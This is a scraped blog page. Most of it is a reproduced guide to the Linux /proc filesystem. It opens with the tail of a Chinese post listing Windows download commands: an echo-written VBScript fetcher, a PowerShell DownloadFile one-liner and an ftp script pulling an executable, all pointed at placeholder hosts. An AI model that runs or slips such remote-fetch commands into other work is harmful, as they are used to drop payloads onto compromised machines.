+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#用echo写入</span><br><span class="line">On Error Resume Next  </span><br><span class="line">Dim iRemote,iLocal  </span><br><span class="line">iLocal = LCase(WScript.Arguments(1))  </span><br><span class="line">iRemote = LCase(WScript.Arguments(0))  </span><br><span class="line">Set xPost = createObject(&quot;Microsoft.XMLHTTP&quot;) </span><br><span class="line">xPost.Open &quot;GET&quot;,iRemote,0 </span><br><span class="line">xPost.Send() </span><br><span class="line">Set sGet = createObject(&quot;ADODB.Stream&quot;) </span><br><span class="line">sGet.Mode = 3 </span><br><span class="line">sGet.Type = 1 </span><br><span class="line">sGet.Open() </span><br><span class="line">sGet.Write(xPost.responseBody) </span><br><span class="line">sGet.SaveToFile iLocal,2</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><code>cscript ff.vbs http://www.xxx.com/xx.jpg xx.jpg</code></p>
+<ol>
+<li><p>powershell<br><code>powershell (new-object System.Net.WebClient).DownloadFile( &#39;http://www.xx.com/ff.jpg&#39;,&#39;c:\aaa.jpg&#39;)</code></p>
+</li>
+<li><p>ftp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo open 8.8.8.8  &gt;a.txt &amp; echo get fuck.exe&gt;&gt;a.txt &amp;echo bye&gt;&gt;a.txt</span><br><span class="line">ftp -A -s:a.txt</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/command/">command</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2019/03/29/OS/proc/"><span>linux /proc目录</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/03/29/OS/proc/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-03-29T07:40:09.893Z">
+          2019-03-29
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h1 id="linux-proc目录"><a href="#linux-proc目录" class="headerlink" title="linux /proc目录"></a>linux /proc目录</h1><p>Linux Filesystem Hierarchy:<br>Prev    Chapter 1. Linux Filesystem Hierarchy    Next<br>1.14. /proc<br>/proc is very special in that it is also a virtual filesystem. It’s sometimes referred to as a process information pseudo-file system. It doesn’t contain ‘real’ files but runtime system information (e.g. system memory, devices mounted, hardware configuration, etc). For this reason it can be regarded as a control and information centre for the kernel. In fact, quite a lot of system utilities are simply calls to files in this directory. For example, ‘lsmod’ is the same as ‘cat /proc/modules’ while ‘lspci’ is a synonym for ‘cat /proc/pci’. By altering files located in this directory you can even read/change kernel parameters (sysctl) while the system is running.</p>
+<p>The most distinctive thing about files in this directory is the fact that all of them have a file size of 0, with the exception of kcore, mtrr and self. A directory listing looks similar to the following:</p>
+<pre><code>total 525256
+dr-xr-xr-x3 root root0 Jan 19 15:00 1
+dr-xr-xr-x3 daemon   root0 Jan 19 15:00 109
+dr-xr-xr-x3 root root0 Jan 19 15:00 170
+dr-xr-xr-x3 root root0 Jan 19 15:00 173
+dr-xr-xr-x3 root root0 Jan 19 15:00 178
+dr-xr-xr-x3 root root0 Jan 19 15:00 2
+dr-xr-xr-x3 root root0 Jan 19 15:00 3
+dr-xr-xr-x3 root root0 Jan 19 15:00 4
+dr-xr-xr-x3 root root0 Jan 19 15:00 421
+dr-xr-xr-x3 root root0 Jan 19 15:00 425
+dr-xr-xr-x3 root root0 Jan 19 15:00 433
+dr-xr-xr-x3 root root0 Jan 19 15:00 439
+dr-xr-xr-x3 root root0 Jan 19 15:00 444
+dr-xr-xr-x3 daemon   daemon  0 Jan 19 15:00 446
+dr-xr-xr-x3 root root0 Jan 19 15:00 449
+dr-xr-xr-x3 root root0 Jan 19 15:00 453
+dr-xr-xr-x3 root root0 Jan 19 15:00 456
+dr-xr-xr-x3 root root0 Jan 19 15:00 458
+dr-xr-xr-x3 root root0 Jan 19 15:00 462
+dr-xr-xr-x3 root root0 Jan 19 15:00 463
+dr-xr-xr-x3 root root0 Jan 19 15:00 464
+dr-xr-xr-x3 root root0 Jan 19 15:00 465
+dr-xr-xr-x3 root root0 Jan 19 15:00 466
+dr-xr-xr-x3 root root0 Jan 19 15:00 467
+dr-xr-xr-x3 gdm  gdm 0 Jan 19 15:00 472
+dr-xr-xr-x3 root root0 Jan 19 15:00 483
+dr-xr-xr-x3 root root0 Jan 19 15:00 5
+dr-xr-xr-x3 root root0 Jan 19 15:00 6
+dr-xr-xr-x3 root root0 Jan 19 15:00 7
+dr-xr-xr-x3 root root0 Jan 19 15:00 8
+-r--r--r--1 root root0 Jan 19 15:00 apm
+dr-xr-xr-x3 root root0 Jan 19 15:00 bus
+-r--r--r--1 root root0 Jan 19 15:00 cmdline
+-r--r--r--1 root root0 Jan 19 15:00 cpuinfo
+-r--r--r--1 root root0 Jan 19 15:00 devices
+-r--r--r--1 root root0 Jan 19 15:00 dma
+dr-xr-xr-x3 root root0 Jan 19 15:00 driver
+-r--r--r--1 root root0 Jan 19 15:00 execdomains
+-r--r--r--1 root root0 Jan 19 15:00 fb
+-r--r--r--1 root root0 Jan 19 15:00 filesystems
+dr-xr-xr-x2 root root0 Jan 19 15:00 fs
+dr-xr-xr-x4 root root0 Jan 19 15:00 ide
+-r--r--r--1 root root0 Jan 19 15:00 interrupts
+-r--r--r--1 root root0 Jan 19 15:00 iomem
+-r--r--r--1 root root0 Jan 19 15:00 ioports
+dr-xr-xr-x   18 root root0 Jan 19 15:00 irq
+-r--------1 root root 536809472 Jan 19 15:00 kcore
+-r--------1 root root0 Jan 19 14:58 kmsg
+-r--r--r--1 root root0 Jan 19 15:00 ksyms
+-r--r--r--1 root root0 Jan 19 15:00 loadavg
+-r--r--r--1 root root0 Jan 19 15:00 locks
+-r--r--r--1 root root0 Jan 19 15:00 mdstat
+-r--r--r--1 root root0 Jan 19 15:00 meminfo
+-r--r--r--1 root root0 Jan 19 15:00 misc
+-r--r--r--1 root root0 Jan 19 15:00 modules
+-r--r--r--1 root root0 Jan 19 15:00 mounts
+-rw-r--r--1 root root  137 Jan 19 14:59 mtrr
+dr-xr-xr-x3 root root0 Jan 19 15:00 net
+dr-xr-xr-x2 root root0 Jan 19 15:00 nv
+-r--r--r--1 root root0 Jan 19 15:00 partitions
+-r--r--r--1 root root0 Jan 19 15:00 pci
+dr-xr-xr-x4 root root0 Jan 19 15:00 scsi
+lrwxrwxrwx1 root root   64 Jan 19 14:58 self -&gt; 483
+-rw-r--r--1 root root0 Jan 19 15:00 slabinfo
+-r--r--r--1 root root0 Jan 19 15:00 stat
+-r--r--r--1 root root0 Jan 19 15:00 swaps
+dr-xr-xr-x   10 root root0 Jan 19 15:00 sys
+dr-xr-xr-x2 root root0 Jan 19 15:00 sysvipc
+dr-xr-xr-x4 root root0 Jan 19 15:00 tty
+-r--r--r--1 root root0 Jan 19 15:00 uptime
+-r--r--r--1 root root0 Jan 19 15:00 version
+</code></pre><p>Each of the numbered directories corresponds to an actual process ID. Looking at the process table, you can match processes with the associated process ID. For example, the process table might indicate the following for the secure shell server:</p>
+<pre><code># ps ax | grep sshd
+439 ? S 0:00 /usr/sbin/sshd
+</code></pre><p>Details of this process can be obtained by looking at the associated files in the directory for this process, /proc/460. You might wonder how you can see details of a process that has a file size of 0. It makes more sense if you think of it as a window into the kernel. The file doesn’t actually contain any data; it just acts as a pointer to where the actual process information resides. For example, a listing of the files in the /proc/460 directory looks similar to the following:</p>
+<pre><code>total 0
+-r--r--r--1 root root0 Jan 19 15:02 cmdline
+lrwxrwxrwx1 root root0 Jan 19 15:02 cwd -&gt; /
+-r--------1 root root0 Jan 19 15:02 environ
+lrwxrwxrwx1 root root0 Jan 19 15:02 exe -&gt; /usr/sbin/sshd
+dr-x------2 root root0 Jan 19 15:02 fd
+-r--r--r--1 root root0 Jan 19 15:02 maps
+-rw-------1 root root0 Jan 19 15:02 mem
+lrwxrwxrwx1 root root0 Jan 19 15:02 root -&gt; /
+-r--r--r--1 root root0 Jan 19 15:02 stat
+-r--r--r--1 root root0 Jan 19 15:02 statm
+-r--r--r--1 root root0 Jan 19 15:02 status
+</code></pre><p>The purpose and contents of each of these files is explained below:</p>
+<p>/proc/PID/cmdline<br>Command line arguments.</p>
+<p>/proc/PID/cpu<br>Current and last cpu in which it was executed.</p>
+<p>/proc/PID/cwd<br>Link to the current working directory.</p>
+<p>/proc/PID/environ<br>Values of environment variables.</p>
+<p>/proc/PID/exe<br>Link to the executable of this process.</p>
+<p>/proc/PID/fd<br>Directory, which contains all file descriptors.</p>
+<p>/proc/PID/maps<br>Memory maps to executables and library files.</p>
+<p>/proc/PID/mem<br>Memory held by this process.</p>
+<p>/proc/PID/root<br>Link to the root directory of this process.</p>
+<p>/proc/PID/stat<br>Process status.</p>
+<p>/proc/PID/statm<br>Process memory status information.</p>
+<p>/proc/PID/status<br>Process status in human readable form.</p>
+<p>Should you wish to know more, the man page for proc describes each of the files associated with a running process ID in far greater detail.</p>
+<p>Even though files appear to be of size 0, examining their contents reveals otherwise:</p>
+<pre><code># cat status
+
+
+Name: sshd
+State: S (sleeping)
+Tgid: 439
+Pid: 439
+PPid: 1
+TracerPid: 0
+Uid: 0 0 0 0
+Gid: 0 0 0 0
+FDSize: 32
+Groups: 
+VmSize: 2788 kB
+VmLck:0 kB
+VmRSS: 1280 kB
+VmData:  252 kB
+VmStk:   16 kB
+VmExe:  268 kB
+VmLib: 2132 kB
+SigPnd: 0000000000000000
+SigBlk: 0000000000000000
+SigIgn: 8000000000001000
+SigCgt: 0000000000014005
+CapInh: 0000000000000000
+CapPrm: 00000000fffffeff
+CapEff: 00000000fffffeff
+</code></pre><p>The files in the /proc directory act very similar to the process ID subdirectory files. For example, examining the contents of the /proc/interrupts file displays something like the following:</p>
+<pre><code># cat interrupts
+
+   CPU0   
+  0:  32657  XT-PIC  timer
+  1:   1063  XT-PIC  keyboard
+  2:  0  XT-PIC  cascade
+  8:  3  XT-PIC  rtc
+  9:  0  XT-PIC  cmpci
+ 11:332  XT-PIC  nvidia
+ 14:   5289  XT-PIC  ide0
+ 15: 13  XT-PIC  ide1
+NMI:  0 
+ERR:  0
+</code></pre><p>Each of the numbers down the left-hand column represents the interrupt that is in use. Examining the contents of the file dynamically gathers the associated data and displays it to the screen. Most of the /proc file system is read-only; however, some files allow kernel variable to be changed. This provides a mechanism to actually tune the kernel without recompiling and rebooting.</p>
+<p>The procinfo utility summarizes /proc file system information into a display similar to the following:</p>
+<pre><code># /usr/bin/procinfo
+
+Linux 2.4.18 (root@DEB) (gcc 2.95.4 20011002 ) #2 1CPU [DEB.(none)]
+
+Memory:  TotalUsedFree  Shared Buffers  Cached
+Mem:513908  107404  406504   02832   82180
+Swap:   265032   0  265032
+
+Bootup: Sun Jan 19 14:58:27 2003Load average: 0.29 0.13 0.05 1/30 566
+
+user  :   0:00:10.26   2.3%  page in :74545  disk 1: 6459r 796w
+nice  :   0:00:00.00   0.0%  page out: 9416  disk 2:   19r   0w
+system:   0:00:19.55   4.5%  swap in :1
+idle  :   0:06:48.30  93.2%  swap out:0
+uptime:   0:07:18.11 context :22059
+
+irq  0: 43811 timer irq  9: 0 cmpci
+irq  1:  1427 keyboard  irq 11:   332 nvidia   
+irq  2: 0 cascade [4]   irq 12: 2  
+irq  6: 2   irq 14:  7251 ide0 
+irq  8: 3 rtc   irq 15:83 ide1             
+</code></pre><p>/proc/apm</p>
+<p> Advanced power management info.</p>
+<p>/proc/bus<br>Directory containing bus specific information.</p>
+<p>/proc/cmdline<br>Kernel command line.</p>
+<p>/proc/cpuinfo</p>
+<p> Information about the processor, such as its type, make, model, and performance.</p>
+<p>/proc/devices</p>
+<p> List of device drivers configured into the currently running kernel (block and character).</p>
+<p>/proc/dma<br>Shows which DMA channels are being used at the moment.</p>
+<p>/proc/driver<br>Various drivers grouped here, currently rtc</p>
+<p>/proc/execdomains<br>Execdomains, related to security.</p>
+<p>/proc/fb<br>Frame Buffer devices.</p>
+<p>/proc/filesystems<br>Filesystems configured/supported into/by the kernel.</p>
+<p>/proc/fs<br>File system parameters, currently nfs/exports.</p>
+<p>/proc/ide<br>This subdirectory contains information about all IDE devices of which the kernel is aware. There is one subdirectory for each IDE controller, the file drivers and a link for each IDE device, pointing to the device directory in the controller-specific subtree. The file drivers contains general information about the drivers used for the IDE devices. More detailed information can be found in the controller-specific subdirectories. These are named ide0, ide1 and so on. Each of these directories contains the files shown here:</p>
+<p>/proc/ide/ide?/channel<br>IDE channel (0 or 1)</p>
+<p>/proc/ide/ide?/config</p>
+<p> Configuration (only for PCI/IDE bridge)</p>
+<p>/proc/ide/ide?/mate<br>Mate name (onchip partnered controller)</p>
+<p>/proc/ide/ide?/model<br>Type/Chipset of IDE controller</p>
+<p> Each device connected to a controller has a separate subdirectory in the controllers directory. The following files listed are contained in these directories:</p>
+<p>/proc/ide/ide?/model/cache<br>The cache.</p>
+<p>/proc/ide/ide?/model/capacity</p>
+<p> Capacity of the medium (in 512Byte blocks)</p>
+<p>/proc/ide/ide?/model/driver</p>
+<p> driver and version</p>
+<p>/proc/ide/ide?/model/geometry</p>
+<p> physical and logical geometry</p>
+<p>/proc/ide/ide?/model/identify</p>
+<p> device identify block</p>
+<p>/proc/ide/ide?/model/media<br>media type</p>
+<p>/proc/ide/ide?/model/model</p>
+<p> device identifier</p>
+<p>/proc/ide/ide?/model/settings</p>
+<p> device setup</p>
+<p>/proc/ide/ide?/model/smart_thresholds</p>
+<p> IDE disk management thresholds</p>
+<p>/proc/ide/ide?/model/smart_values</p>
+<p> IDE disk management values</p>
+<p>/proc/interrupts<br>Shows which interrupts are in use, and how many of each there have been.</p>
+<p>You can, for example, check which interrupts are currently in use and what they are used for by looking in the file /proc/interrupts:</p>
+<pre><code># cat /proc/interrupts
+
+
+  CPU0 0: 8728810 
+  XT-PIC timer 1: 895
+  XT-PIC keyboard 2: 
+  0 XT-PIC cascade 3: 531695 
+  XT-PIC aha152x 4: 2014133
+  XT-PIC serial 5: 44401 
+  XT-PIC pcnet_cs 8: 2 
+  XT-PIC rtc 11: 8 
+  XT-PIC i82365 12: 182918 
+  XT-PIC PS/2 Mouse 13: 1 
+  XT-PIC fpu 14: 1232265 
+  XT-PIC ide0 15: 7
+  XT-PIC ide1 NMI: 0 
+</code></pre><p>In 2.4 based kernels a couple of lines were added to this file LOC &amp; ERR (this is the output of an SMP machine):</p>
+<pre><code># cat /proc/interrupts
+
+
+  CPU0 CPU1 
+  0: 1243498 1214548 IO-APIC-edge timer 
+  1: 8949 8958 IO-APIC-edge keyboard 
+  2: 0 0 XT-PIC cascade 
+  5: 11286 10161 IO-APIC-edge soundblaster 
+  8: 1 0 IO-APIC-edge rtc 
+  9: 27422 27407 IO-APIC-edge 3c503 
+  12: 113645 113873 IO-APIC-edge PS/2 Mouse 
+  13: 0 0 XT-PIC fpu 14: 22491 24012 IO-APIC-edge ide0 
+  15: 2183 2415 IO-APIC-edge ide1 
+  17: 30564 30414 IO-APIC-level eth0 
+  18: 177 164 IO-APIC-level bttv NMI: 2457961 2457959 
+  LOC: 2457882 2457881 ERR: 2155 
+</code></pre><p>NMI is incremented in this case because every timer interrupt generates a NMI (Non Maskable Interrupt) which is used by the NMI Watchdog to detect lookups.</p>
+<p>LOC is the local interrupt counter of the internal APIC of every CPU.</p>
+<p>ERR is incremented in the case of errors in the IO-APIC bus (the bus that connects the CPUs in an SMP system. This means that an error has been detected, the IO-APIC automatically retries the transmission, so it should not be a big problem, but you should read the SMP-FAQ.</p>
+<p>In this context it could be interesting to note the new irq directory in 2.4. It could be used to set IRQ to CPU affinity, this means that you can “hook” an IRQ to only one CPU, or to exclude a CPU from handling IRQs. The contents of the irq subdir is one subdir for each IRQ, and one file; prof_cpu_mask. For example,</p>
+<pre><code># ls /proc/irq/ 0 10 12 14 16 18 2 4 6 8 prof_cpu_mask 
+1 11 13 15 17 19 3 5 7 9
+
+
+# ls /proc/irq/0/ smp_affinity
+</code></pre><p>The contents of the prof_cpu_mask file and each smp_affinity file for each IRQ is the same by default:</p>
+<pre><code># cat /proc/irq/0/smp_affinity
+ffffffff 
+</code></pre><p>It’s a bitmask, in which you can specify which CPUs can handle the IRQ, you can set it by doing:</p>
+<pre><code># echo 1 &gt; /proc/irq/prof_cpu_mask
+</code></pre><p>This means that only the first CPU will handle the IRQ, but you can also echo 5 which means that only the first and fourth CPU can handle the IRQ. The way IRQs are routed is handled by the IO-APIC, and its Round Robin between all the CPUs which are allowed to handle it. As usual the kernel has more info than you and does a better job than you, so the defaults are the best choice for almost everyone.</p>
+<p>/proc/iomem<br>Memory map.</p>
+<p>/proc/ioports<br>Which I/O ports are in use at the moment.</p>
+<p>/proc/irq<br>Masks for irq to cpu affinity.</p>
+<p>/proc/isapnp</p>
+<p> ISA PnP (Plug&amp;Play) Info.</p>
+<p>/proc/kcore<br>An image of the physical memory of the system (can be ELF or A.OUT (deprecated in 2.4)). This is exactly the same size as your physical memory, but does not really take up that much memory; it is generated on the fly as programs access it. (Remember: unless you copy it elsewhere, nothing under /proc takes up any disk space at all.)</p>
+<p>/proc/kmsg<br>Messages output by the kernel. These are also routed to syslog.</p>
+<p>/proc/ksyms<br>Kernel symbol table.</p>
+<p>/proc/loadavg<br>The ‘load average’ of the system; three indicators of how much work the system has done during the last 1, 5 &amp; 15 minutes.</p>
+<p>/proc/locks<br>Kernel locks.</p>
+<p>/proc/meminfo<br>Information about memory usage, both physical and swap. Concatenating this file produces similar results to using ‘free’ or the first few lines of ‘top’.</p>
+<p>/proc/misc<br>Miscellaneous pieces of information. This is for information that has no real place within the rest of the proc filesystem.</p>
+<p>/proc/modules<br>Kernel modules currently loaded. Typically its output is the same as that given by the ‘lsmod’ command.</p>
+<p>/proc/mounts<br>Mounted filesystems</p>
+<p>/proc/mtrr<br>Information regarding mtrrs. (On Intel P6 family processors (Pentium Pro, Pentium II and later) the Memory Type Range Registers (MTRRs) may be used to control processor access to memory ranges. This is most useful when you have a video (VGA) card on a PCI or AGP bus. Enabling write-combining allows bus write transfers to be combined into a larger transfer before bursting over the PCI/AGP bus. This can increase performance of image write operations 2.5 times or more. The Cyrix 6x86, 6x86MX and M II processors have Address Range Registers (ARRs) which provide a similar functionality to MTRRs. For these, the ARRs are used to emulate the MTRRs. The AMD K6-2 (stepping 8 and above) and K6-3 processors have two MTRRs. These are supported. The AMD Athlon family provide 8 Intel style MTRRs. The Centaur C6 (WinChip) has 8 MCRs, allowing write-combining. These are also supported. The VIA Cyrix III and VIA C3 CPUs offer 8 Intel style MTRRs.) For more details regarding mtrr technology see /usr/src/linux/Documentation/mtrr.txt.</p>
+<p>/proc/net<br>Status information about network protocols.</p>
+<p>IPv6 information<br>/proc/net/udp6</p>
+<p> UDP sockets (IPv6).</p>
+<p>/proc/net/tcp6<br>TCP sockets (IPv6).</p>
+<p>/proc/net/raw6</p>
+<p> Raw device statistics (IPv6).</p>
+<p>/proc/net/igmp6<br>IP multicast addresses, which this host joined (IPv6).</p>
+<p>/proc/net/if_inet6<br>List of IPv6 interface addresses.</p>
+<p>/proc/net/ipv6_route<br>Kernel routing table for IPv6.</p>
+<p>/proc/net/rt6_stats<br>Global IPv6 routing tables statistics.</p>
+<p>/proc/net/sockstat6<br>Socket statistics (IPv6).</p>
+<p>/proc/net/snmp6<br>Snmp data (IPv6).</p>
+<p>General Network information<br>/proc/net/arp</p>
+<p> Kernel ARP table.</p>
+<p>/proc/net/dev<br>network devices with statistics.</p>
+<p>/proc/net/dev_mcast<br>the Layer2 multicast groups which a device is listening to (interface index, label, number of references, number of bound addresses).</p>
+<p>/proc/net/dev_stat<br>network device status.</p>
+<p>/proc/net/ip_fwchains</p>
+<p> Firewall chain linkage.</p>
+<p>/proc/net/ip_fwnames<br>Firewall chain names.</p>
+<p>/proc/net/ip_masq</p>
+<p> Directory containing the masquerading tables.</p>
+<p>/proc/net/ip_masquerade<br>Major masquerading table.</p>
+<p>/proc/net/netstat<br>Network statistics.</p>
+<p>/proc/net/raw</p>
+<p> raw device statistics.</p>
+<p>/proc/net/route<br>Kernel routing table.</p>
+<p>/proc/net/rpc</p>
+<p> Directory containing rpc info.</p>
+<p>/proc/net/rt_cache<br>Routing cache.</p>
+<p>/proc/net/snmp<br>SNMP data.</p>
+<p>/proc/net/sockstat<br>Socket statistics.</p>
+<p>/proc/net/tcp</p>
+<p> TCP sockets.</p>
+<p>/proc/net/tr_rif</p>
+<p> Token ring RIF routing table.</p>
+<p>/proc/net/udp<br>UDP sockets.</p>
+<p>/proc/net/unix<br>UNIX domain sockets.</p>
+<p>/proc/net/wireless</p>
+<p> Wireless interface data (Wavelan etc).</p>
+<p>/proc/net/igmp<br>IP multicast addresses, which this host joined.</p>
+<p>/proc/net/psched<br>Global packet scheduler parameters.</p>
+<p>/proc/net/netlink<br>List of PF_NETLINK sockets.</p>
+<p>/proc/net/ip_mr_vifs<br>List of multicast virtual interfaces.</p>
+<p>/proc/net/ip_mr_cache<br>List of multicast routing cache.</p>
+<p>You can use this information to see which network devices are available in your system and how much traffic was routed over those devices. In addition, each Channel Bond interface has its own directory. For example, the bond0 device will have a directory called /proc/net/bond0/. It will contain information that is specific to that bond, such as the current slaves of the bond, the link status of the slaves, and how many times the slaves link has failed.</p>
+<p>/proc/parport</p>
+<p> The directory /proc/parport contains information about the parallel ports of your system. It has one subdirectory for each port, named after the port number (0,1,2,…).</p>
+<p>/proc/parport/autoprobe</p>
+<p> Any IEEE-1284 device ID information that has been acquired.</p>
+<p>/proc/parport/devices<br>list of the device drivers using that port. A + will appear by the name of the device currently using the port (it might not appear against any).</p>
+<p>/proc/parport/hardware<br>Parallel port’s base address, IRQ line and DMA channel.</p>
+<p>/proc/parport/irq<br>IRQ that parport is using for that port. This is in a separate file to allow you to alter it by writing a new value in (IRQ number or none).</p>
+<p>/proc/partitions<br>Table of partitions known to the system</p>
+<p>/proc/pci, /proc/bus/pci</p>
+<p> Depreciated info of PCI bus.</p>
+<p>/proc/rtc<br>Real time clock</p>
+<p>/proc/scsi<br>If you have a SCSI host adapter in your system, you’ll find a subdirectory named after the driver for this adapter in /proc/scsi. You’ll also see a list of all recognized SCSI devices in /proc/scsi. The directory named after the driver has one file for each adapter found in the system. These files contain information about the controller, including the used IRQ and the IO address range. The amount of information shown is dependent on the adapter you use.</p>
+<p>/proc/self<br>A symbolic link to the process directory of the program that is looking at /proc. When two processes look at /proc, they get different links. This is mainly a convenience to make it easier for programs to get at their process directory.</p>
+<p>/proc/slabinfo</p>
+<p> The slabinfo file gives information about memory usage at the slab level. Linux uses slab pools for memory management above page level in version 2.2. Commonly used objects have their own slab pool (such as network buffers, directory cache, and so on).</p>
+<p>/proc/stat<br>Overall/various statistics about the system, such as the number of page faults since the system was booted.</p>
+<p>/proc/swaps<br>Swap space utilization</p>
+<p>/proc/sys</p>
+<p> This is not only a source of information, it also allows you to change parameters within the kernel without the need for recompilation or even a system reboot. Take care when attempting this as it can both optimize your system and also crash it. It is advisable to read both documentation and source before actually making adjustments. The entries in /proc may change slightly between kernel versions, so if there is any doubt review the kernel documentation in the directory /usr/src/linux/Documentation. Under some circumstances, you may have no alternative but to reboot the machine once an error occurs. To change a value, simply echo the new value into the file. An example is given below in the section on the file system data. Of course, you need to be ‘root’ to do any of this. You can create your own boot script to perform this every time your system boots.</p>
+<p>/proc/sys/fs<br>Contains file system data. This subdirectory contains specific file system, file handle, inode, dentry and quota information.</p>
+<p>dentry-state<br>Status of the directory cache. Since directory entries are dynamically allocated and deallocated, this file indicates the current status. It holds six values, in which the last two are not used and are always zero. The others are listed below:</p>
+<pre><code>File  Content 
+nr_dentry Almost always zero 
+nr_unused Number of unused cache entries 
+age_limit in seconds after the entry may be 
+      reclaimed, when memory is short want_pages internally
+</code></pre><p>dquot-max</p>
+<p> The file dquot-max shows the maximum number of cached disk quota entries.</p>
+<p>dquot-nr</p>
+<p> shows the number of allocated disk quota entries and the number of free disk quota entries. If the number of available cached disk quotas is very low and you have a large number of simultaneous system users, you might want to raise the limit.</p>
+<p>file-nr and file-max<br>The kernel allocates file handles dynamically, but doesn’t free them again at this time. The value in file-max denotes the maximum number of file handles that the Linux kernel will allocate. When you get a lot of error messages about running out of file handles, you might want to raise this limit. The default value is 4096. To change it, just write the new number into the file:</p>
+<pre><code># cat /proc/sys/fs/file-max
+4096
+# echo 8192 &gt; /proc/sys/fs/file-max
+# cat /proc/sys/fs/file-max
+8192
+</code></pre><p>This method of revision is useful for all customizable parameters of the kernel - simply echo the new value to the corresponding file.</p>
+<p>The three values in file-nr denote the number of allocated file handles, the number of used file handles, and the maximum number of file handles. When the allocated file handles come close to the maximum, but the number of actually used handles is far behind, you’ve encountered a peak in your usage of file handles and you don’t need to increase the maximum.</p>
+<p>inode-state, inode-nr and inode-max<br>As with file handles, the kernel allocates the inode structures dynamically, but can’t free them yet.</p>
+<p>The value in inode-max denotes the maximum number of inode handlers. This value should be 3 to 4 times larger than the value in file-max, since stdin, stdout, and network sockets also need an inode struct to handle them. If you regularly run out of inodes, you should increase this value.</p>
+<p>The file inode-nr contains the first two items from inode-state, so we’ll skip to that file…</p>
+<p>inode-state contains three actual numbers and four dummy values. The numbers are nr_inodes, nr_free_inodes, and preshrink (in order of appearance).</p>
+<p>nr_inodes<br>Denotes the number of inodes the system has allocated. This can be slightly more than inode-max because Linux allocates them one pageful at a time.</p>
+<p>nr_free_inodes<br>Represents the number of free inodes and preshrink is nonzero when nr_inodes is greater than inode-max and the system needs to prune the inode list instead of allocating more.</p>
+<p>super-nr and super-max</p>
+<p> Again, super block structures are allocated by the kernel, but not freed. The file super-max contains the maximum number of super block handlers, where super-nr shows the number of currently allocated ones. Every mounted file system needs a super block, so if you plan to mount lots of file systems, you may want to increase these numbers.</p>
+<p>binfmt_misc</p>
+<p> This handles the kernel support for miscellaneous binary formats. binfmt_misc provides the ability to register additional binary formats to the kernel without compiling an additional module/kernel. Therefore, binfmt_misc needs to know magic numbers at the beginning or the filename extension of the binary. It works by maintaining a linked list of structs that contain a description of a binary format, including a magic with size (or the filename extension), offset and mask, and the interpreter name. On request it invokes the given interpreter with the original program as argument, as binfmt_java and binfmt_em86 and binfmt_mz do. Since binfmt_misc does not define any default binary-formats, you have to register an additional binary-format. There are two general files in binfmt_misc and one file per registered format. The two general files are register and status. To register a new binary format you have to issue the command echo :name:type:offset:magic:mask:interpreter: &gt; /proc/sys/fs/binfmt_misc/register with appropriate name (the name for the /proc-dir entry), offset (defaults to 0, if omitted), magic, mask (which can be omitted, defaults to all 0xff) and last but not least, the interpreter that is to be invoked (for example and testing /bin/echo). Type can be M for usual magic matching or E for filename extension matching (give extension in place of magic). If you do a cat on the file /proc/sys/fs/binfmt_misc/status, you will get the current status (enabled/disabled) of binfmt_misc. Change the status by echoing 0 (disables) or 1 (enables) or -1 (caution: this clears all previously registered binary formats) to status. For example echo 0 &gt; status to disable binfmt_misc (temporarily). Each registered handler has an entry in /proc/sys/fs/binfmt_misc. These files perform the same function as status, but their scope is limited to the actual binary format. By ‘cating’ this file, you also receive all related information about the interpreter/magic of the binfmt. An example of the usage of binfmt_misc (emulate binfmt_java) follows:</p>
+<pre><code>cd /proc/sys/fs/binfmt_misc 
+echo &apos;:Java:M::\xca\xfe\xba\xbe::/usr/local/java/bin/javawrapper:&apos; 
+&gt; register 
+echo &apos;:HTML:E::html::/usr/local/java/bin/appletviewer:&apos;
+&gt; register 
+echo &apos;:Applet:M::&lt;!--applet::/usr/local/java/bin/appletviewer:&apos; &gt;
+register 
+echo &apos;:DEXE:M::\x0eDEX::/usr/bin/dosexec:&apos; &lt; register
+</code></pre><p> These four lines add support for Java executables and Java applets (like binfmt_java, additionally recognizing the .html extension with no need to put &lt;!–applet&gt; to every applet file). You have to install the JDK and the shell-script /usr/local/java/bin/javawrapper too. It works around the brokenness of the Java filename handling. To add a Java binary, just create a link to the class-file somewhere in the path.</p>
+<p>/proc/sys/kernel<br>This directory reflects general kernel behaviors and the contents will be dependent upon your configuration. Here you’ll find the most important files, along with descriptions of what they mean and how to use them.</p>
+<p>/proc/sys/kernel/acct<br>The file contains three values; highwater, lowwater, and frequency. It exists only when BSD-style process accounting is enabled. These values control its behavior. If the free space on the file system where the log lives goes below lowwater percentage, accounting suspends. If it goes above highwater percentage, accounting resumes. Frequency determines how often you check the amount of free space (value is in seconds). Default settings are: 4, 2, and 30. That is, suspend accounting if there is less than 2 percent free; resume it if we have a value of 3 or more percent; consider information about the amount of free space valid for 30 seconds</p>
+<p>/proc/sys/kernel/ctrl-alt-del</p>
+<p> When the value in this file is 0, ctrl-alt-del is trapped and sent to the init program to handle a graceful restart. However, when the value is greater that zero, Linux’s reaction to this key combination will be an immediate reboot, without syncing its dirty buffers. It should be noted that when a program (like dosemu) has the keyboard in raw mode, the ctrl-alt-del is intercepted by the program before it ever reaches the kernel tty layer, and it is up to the program to decide what to do with it.</p>
+<p>/proc/sys/kernel/domainname, /proc/sys/kernel/hostname</p>
